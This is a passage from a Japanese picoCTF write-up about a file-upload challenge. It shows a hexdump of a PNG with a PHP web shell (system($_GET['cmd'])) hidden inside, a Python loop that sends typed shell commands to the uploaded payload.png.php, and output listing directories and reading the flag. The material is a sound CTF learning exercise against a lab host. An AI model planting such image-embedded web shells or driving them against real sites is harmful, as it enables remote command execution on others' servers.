000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000c0: 001e 5055 6e4b 3c3f 7068 7020 7379 7374  ..PUnK&lt;?php syst
000000d0: 656d 2824 5f47 4554 5b27 636d 6427 5d29  em($_GET['cmd'])
000000e0: 3b20 3f3e 4d17 ebeb 0049 454e 44         ; ?&gt;M....IEND
</code></pre>
<p>使いやすいようなスクリプトも書いた。</p>
<pre><code class="language-python">import requests
import urllib.parse

url = &quot;http://atlas.picoctf.net:59319/uploads/payload.png.php?cmd=&quot;

while True:
    payload = &quot;echo '\n';&quot; + input(&quot;$ &quot;)
    urllib.parse.quote(payload)
    resp = requests.get(url + payload)
    print(resp.text)
</code></pre>
<pre><code>$ ls
�PNG

�nDR ���        pHYs���+DATH���1 �O�a
   Ȣ��IEND�B`�PUnK

payload.png.php
M��IEND
$ ls ../
�PNG

�nDR ���        pHYs���+DATH���1 �O�a
   Ȣ��IEND�B`�PUnK

MFRDAZLDMUYDG.txt
index.php
instructions.txt
robots.txt
uploads
M��IEND
$ cat ../MFRDAZLDMUYDG.txt
�PNG

�nDR ���        pHYs���+DATH���1 �O�a
   Ȣ��IEND�B`�PUnK

/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03} */M��IEND
$
</code></pre>
<p>writeup終わり。次は<a href="https://ctftime.org/event/2254">Space Heroes 2024</a>に参加してそのWriteupを書く予定。</p>
